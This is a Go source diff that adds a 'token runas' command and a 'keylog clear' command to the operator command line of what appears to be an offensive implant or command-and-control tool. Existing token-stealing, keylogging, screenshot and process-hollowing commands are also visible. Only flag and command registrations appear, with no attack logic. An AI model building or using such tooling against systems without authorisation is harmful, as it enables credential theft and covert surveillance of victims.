@@ -2256,6 +2256,7 @@ func init() {
 	tokenCmd.AddCommand(tokenStealCmd)
 	tokenCmd.AddCommand(tokenMakeCmd)
 	tokenCmd.AddCommand(tokenRevertCmd)
+	tokenCmd.AddCommand(tokenRunasCmd)
 	tokenListCmd.Flags().Bool("wait", true, "Wait for token list result")
 	tokenListCmd.Flags().Int("timeout", 30, "Seconds to wait")
 	tokenStealCmd.Flags().Uint32("pid", 0, "PID to steal token from (required)")
@@ -2268,6 +2269,13 @@ func init() {
 	tokenMakeCmd.Flags().Int("timeout", 15, "Seconds to wait")
 	tokenRevertCmd.Flags().Bool("wait", false, "Wait for result")
 	tokenRevertCmd.Flags().Int("timeout", 10, "Seconds to wait")
+	tokenRunasCmd.Flags().Uint32("pid", 0, "PID to steal token from")
+	tokenRunasCmd.Flags().String("args", "", "Arguments to pass to exe")
+	tokenRunasCmd.Flags().String("user", "", "Username for LogonUser token")
+	tokenRunasCmd.Flags().String("domain", ".", "Domain for LogonUser token")
+	tokenRunasCmd.Flags().String("pass", "", "Password for LogonUser token")
+	tokenRunasCmd.Flags().Bool("wait", false, "Wait for result")
+	tokenRunasCmd.Flags().Int("timeout", 30, "Seconds to wait")
 
 	// Phase 3: Screenshot
 	rootCmd.AddCommand(screenshotCmd)
@@ -2280,11 +2288,14 @@ func init() {
 	keylogCmd.AddCommand(keylogStartCmd)
 	keylogCmd.AddCommand(keylogDumpCmd)
 	keylogCmd.AddCommand(keylogStopCmd)
+	keylogCmd.AddCommand(keylogClearCmd)
 	keylogStartCmd.Flags().Int("duration", 0, "Auto-stop after N seconds (0 = run until stop)")
 	keylogStartCmd.Flags().Bool("wait", false, "Wait for start confirmation")
 	keylogStartCmd.Flags().Int("timeout", 15, "Seconds to wait")
 	keylogDumpCmd.Flags().Int("timeout", 15, "Seconds to wait for keystrokes")
 	keylogStopCmd.Flags().Int("timeout", 15, "Seconds to wait for final buffer")
+	keylogClearCmd.Flags().Bool("wait", false, "Wait for confirmation")
+	keylogClearCmd.Flags().Int("timeout", 10, "Seconds to wait")
 
 	// Phase 4: Advanced injection
 	rootCmd.AddCommand(hollowCmd)
